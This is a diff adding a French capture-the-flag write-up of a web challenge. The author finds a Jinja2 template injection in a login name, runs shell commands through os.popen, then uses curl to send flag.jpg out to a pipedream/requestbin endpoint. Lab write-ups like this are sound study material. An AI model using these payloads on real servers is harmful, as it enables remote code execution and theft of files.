@@ -6,5 +6,111 @@ categories: tamilctf
 ---
 
 
+# Introduction
+
+Ce challenge fait partie des challenges web.
+
+# Résolution
+
+Lorsque j'ouvre la page pour débuter le challenge, une page de login apparaît.
+
+![1](https://user-images.githubusercontent.com/16634117/135445836-71bcee4f-83c2-4b99-9e5b-8a7346de9a6d.png)
+
+Je tente d'abord un login aléatoire toto/toto afin de voir ce qu'il se passe, je tombe directement sur une nouvelle page m'indiquant la présence du flag dans l'image flag.jpg. 
+
+![2](https://user-images.githubusercontent.com/16634117/135445985-2c9546a9-d679-4bc4-907c-4f0f226c9380.png)
+
+Tout naturellement je tente d'accèder à cette image.
+
+![1-1](https://user-images.githubusercontent.com/16634117/135446040-999b482c-fcb2-4f09-b21e-aed6fe260d04.png)
+
+Evidemment rien...
+
+Je décide donc de jeter un oeil au html de la page précédente.
+
+![3](https://user-images.githubusercontent.com/16634117/135446161-86e363f8-f8a7-418f-89ab-3dd2cb35b762.png)
+
+En commentaire se trouve "Hello" suivi du nom utilisé pour le login. Je tente donc de transformer cela pour pouvoir insérer des balises html en bypassant le commentaire. 
+
+![4](https://user-images.githubusercontent.com/16634117/135446343-6e6e8694-8b95-4c6b-a527-e0db4e475b1f.png)
+
+Et le résultat :
+
+![5](https://user-images.githubusercontent.com/16634117/135446394-f641c8f6-06a9-45cd-b23b-7f35939daab6.png)
+
+Je peux donc injecter du code dans la page... Mais aucune notion d'admin qui doit passer pour vérifier quoi que ce soit, j'écarte donc rapidement la possibilité d'un vol de session.
+
+Je jète un petit coup d'oeil aux requetes et je vois un indice intéressant, le serveur est en python.
+
+![6](https://user-images.githubusercontent.com/16634117/135446526-9d564211-ff3d-4673-b42b-97ddca26be8d.png)
+
+Je me suis souvenu d'un challenge root-me visant à injecter des templates pour executer du code, je me dis que cette piste est intéressante.
+
+Pour vérifier mon hypothèse il me suffit d'injecter un template tout simple comme `{{7 * 7}}` ; si le serveur effectue la multiplication, alors la faille est exploitable.
+
+![7](https://user-images.githubusercontent.com/16634117/135446757-0a62b6c5-39e7-48fc-8411-70cfe397e1a9.png)
+
+![8](https://user-images.githubusercontent.com/16634117/135446779-5f18bf36-d53b-462b-be69-efdd52dfc581.png)
+
+Le code est exécuté ! 
+
+A partir de la, un petit détour sur le [repo github payloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) va me donner une liste d'injections qui me permettra d'arriver à mes fins.
+
+je tente d'abord de trouver l'uid côté serveur, la charge est la suivante :
+
+`--> {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}`
+
+Et la réponse :
+
+![9](https://user-images.githubusercontent.com/16634117/135447259-653f1ee8-ce80-4d18-af7a-2056153b9f01.png)
+
+Interessant... Voyonsvoir si je peux lister les fichiers à la racine du serveur web :
+
+`--> {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls').read() }}`
+
+Et la réponse :
+
+![10](https://user-images.githubusercontent.com/16634117/135447364-34f4895c-3e2b-4d8f-ac02-f1e9a1c9ef17.png)
+
+J'essaye donc de récuperer l'image en base 64 
+
+`--> {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('base64 flag.jpg').read() }}`
+
+La réponse est vide... Il y a effectivement un fichier "flag.jpg" mais les droits m'empechent d'y accéder.
+
+Je copie donc l'image dans le répertoire `/tmp` pour travailler proprement.
+
+`--> {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cp flag.jpg /tmp/flag.jpg').read() }}`
+
+Je fais maintenant un endpoint de récupération de requêtes grâce au site [requestbin](https://requestbin.com/?gclid=EAIaIQobChMIw426kM2m8wIVWMvICh31gwmLEAAYASAAEgIPHfD_BwE)
+
+Et je tente d'envoyer une requête depuis le serveur, afin de vérifier que je peux sortir en http :
+
+`--> {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl https://en0siis5jevxc.x.pipedream.net').read() }}`
+
+La réponse sur le site :
+
+![12](https://user-images.githubusercontent.com/16634117/135448042-d73f89f5-a574-4d81-b3a9-27afb02097c1.png)
+
+Et sur mon endpoint :
+
+![13](https://user-images.githubusercontent.com/16634117/135448075-7e8221cf-0818-417f-b38b-f0048a70b010.png)
+
+J'ai donc tous les élements pour terminer le challenge :
+
+`--> {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl -F  "image=@/tmp/flag.jpg" https://en0siis5jevxc.x.pipedream.net').read() }}`
+
+Qui me donne :
+
+![14](https://user-images.githubusercontent.com/16634117/135448201-56f99f3f-77c5-407f-8023-d8787beb47a6.png)
+
+je récupère cette donnée brute et la retransorme en image :
+
+![file](https://user-images.githubusercontent.com/16634117/135448266-7c4f2636-15cf-4c61-8cd1-b801bca70199.png)
+
+Bingo !
+
+
+
 
 
